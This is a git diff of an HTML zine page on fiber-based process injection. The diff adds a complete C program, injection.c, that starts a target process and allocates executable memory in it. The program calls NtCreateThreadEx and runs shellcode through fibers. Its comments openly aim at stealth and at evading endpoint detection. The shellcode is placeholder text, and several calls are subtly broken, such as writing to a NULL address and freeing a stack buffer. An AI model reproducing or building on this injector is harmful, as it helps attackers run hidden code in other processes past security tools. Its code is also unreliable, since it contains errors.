@@ -6,7 +6,7 @@
   <title>Fiber-based Injection</title>
   <style>
     /* General Reset */
-    body, h1, h2, p, code {
+    body, h1, h2, p, code, pre {
       margin: 0;
       padding: 0;
       font-family: 'Arial', sans-serif;
@@ -77,7 +77,7 @@
       margin-bottom: 10px;
     }
 
-    .box p, .box code {
+    .box p, .box code, .box pre {
       font-size: 1rem;
       line-height: 1.8;
       white-space: pre-wrap;
@@ -131,7 +131,7 @@
 hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_ALL_ACCESS, FALSE, pi.dwProcessId);
 if (hProcess) {
     LPVOID fiberMain = ConvertThreadToFiber(NULL); // Convert the thread to a fiber
-    LPVOID debugFiber = CreateFiber(0, debug, argv[1]); // Setting up the fiber
+    LPVOID debugFiber = CreateFiber(0, finalFiber, NULL); // Setting up the fiber
 
     printf("About to run the shellcode...\n"); // Prep done 
 
@@ -146,10 +146,145 @@ if (hProcess) {
         </code>
         <p>This snippet creates a fiber inside of the created process and then proceeds with its action.</p>
       </div>
+
+      <div class="box" id="code">
+        <h2>injection.c</h2>
+        <pre>
+#include <windows.h>
+#include <winternl.h>
+#include <stdio.h>
+
+//By Sleepy http://github.com/SleepyG8 ;)
+
+HANDLE hProcess;
+LPVOID remoteMem;
+
+typedef NTSTATUS(NTAPI *NtCreateThreadEx_t)(
+    PHANDLE ThreadHandle,
+    ACCESS_MASK DesiredAccess,
+    PVOID ObjectAttributes,
+    HANDLE ProcessHandle,
+    PVOID lpStartAddress,
+    PVOID lpParameter,
+    ULONG Flags,
+    SIZE_T StackZeroBits,
+    SIZE_T SizeOfStackCommit,
+    SIZE_T SizeOfStackReserve,
+    PVOID lpBytesBuffer
+); // Setting ntcreatethreadex struct
+
+BOOL WINAPI finalFiber(LPVOID param) {
+    printf("Executing shellcode in remote fiber...\n");
+
+    DWORD oldProtect;
+    VirtualProtectEx(hProcess, remoteMem, 300, PAGE_EXECUTE_READWRITE, &oldProtect);
+
+    ((void(*)())remoteMem)(); // Exec
+    return TRUE;
+}
+
+BOOL WINAPI finalExec() {
+    LPVOID fiberMain = ConvertThreadToFiber(NULL); // Convert the thread to a fiber
+    LPVOID debugFiber = CreateFiber(0, finalFiber, NULL); // Setting up fiber
+
+    printf("About to run the shellcode...\n"); // Prep done 
+
+    SwitchToFiber(debugFiber);
+
+    // Hidden process + obfuscated shellcode = full control
+
+    DeleteFiber(debugFiber); 
+
+    return TRUE;
+}
+
+BOOL WINAPI debug(LPCVOID param) {
+    unsigned char shellcode1[] = "first half here";
+    unsigned char shellcode2[] = "second half here\n";
+    // Must be encrypted/decrypted for more obfuscation
+
+    char finalShellcode[500]; // Use stack for more stealth
+    if (!finalShellcode) return FALSE; 
+
+    memcpy(finalShellcode, (char*)shellcode1, strlen(shellcode1));
+    memcpy(finalShellcode + strlen(shellcode1), (char*)shellcode2, strlen(shellcode2)); // Combine chars ;)
+
+    remoteMem = VirtualAllocEx(hProcess, NULL, 1024, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); // Alloc in remote proc
+
+    if (!remoteMem) {
+        printf("Error writing to memory\n");
+        VirtualFreeEx(hProcess, finalShellcode, 0, MEM_RELEASE);
+        CloseHandle(hProcess);
+        return FALSE;
+    }
+
+    if (!WriteProcessMemory(hProcess, NULL, finalShellcode, sizeof(finalShellcode), NULL)) {
+        printf("Error writing to process memory\n");
+        VirtualFreeEx(hProcess, finalShellcode, 0, MEM_RELEASE); // Writing
+        CloseHandle(hProcess);
+        return FALSE;
+    }
+
+    NtCreateThreadEx_t NtCreateThreadEx = (NtCreateThreadEx_t)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtCreateThreadEx");
+    if (!NtCreateThreadEx) {
+        printf("Failed to resolve NtCreateThreadEx.\n");
+        return 1;
+    }
+
+    HANDLE hThread = NULL;
+    NTSTATUS status = NtCreateThreadEx(&hThread, 0x1FFFFF, NULL, hProcess, finalExec, NULL, FALSE, 0, 0, 0, NULL);
+
+    if (status != 0 || !hThread) {
+        printf("Failed to create remote thread.\n");
+        VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE); // Most looked-at call by EDRs; fiber helps hide this
+        CloseHandle(hProcess);
+        return 1;
+    }
+
+    free(finalShellcode);
+    return TRUE;
+}
+
+int main(int argc, char* argv[]) {
+    if (argc < 2 || strcmp(argv[1], "help") == 0) {
+        printf("Usage: %s <path to process>\n", argv[0]);
+    }
+
+    STARTUPINFO si = { sizeof(si) };
+    PROCESS_INFORMATION pi = { 0 };
+
+    if (CreateProcess(argv[1], NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
+        printf("Opening process %s:\n", argv[1]);
+    } else {
+        printf("Error creating process\n");
+    }
+
+    hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_ALL_ACCESS, FALSE, pi.dwProcessId);
+    if (hProcess) {
+        LPVOID fiberMain = ConvertThreadToFiber(NULL); // Convert the thread to a fiber
+        LPVOID debugFiber = CreateFiber(0, debug, argv[1]); // Setting up fiber
+
+        printf("About to run the shellcode...\n"); // Prep done 
+
+        SwitchToFiber(debugFiber);
+
+        // Hidden proc + obfuscated shellcode = full control
+
+        DeleteFiber(debugFiber); 
+
+    } else {
+        printf("Failed to open process\n");
+    }
+
+    return 0;
+}
+        </pre>
+      </div>
     </div>
 
     <footer>
-      <p>Thank you for engaging with my zine on Fiber-based Injection. I hope this resource has provided valuable insights. Keep up with modern security by reading my zines.</p>
+      <p>Thank you for engaging with my zine on Fiber-based Injection.</p>
+      <p>Until next time - Sleepy</p>
       <p>&copy; 2025 Sleepy All Rights Reserved. | <a href="https://github.com/sleepyG8">GitHub</a></p>
     </footer>
   </div>
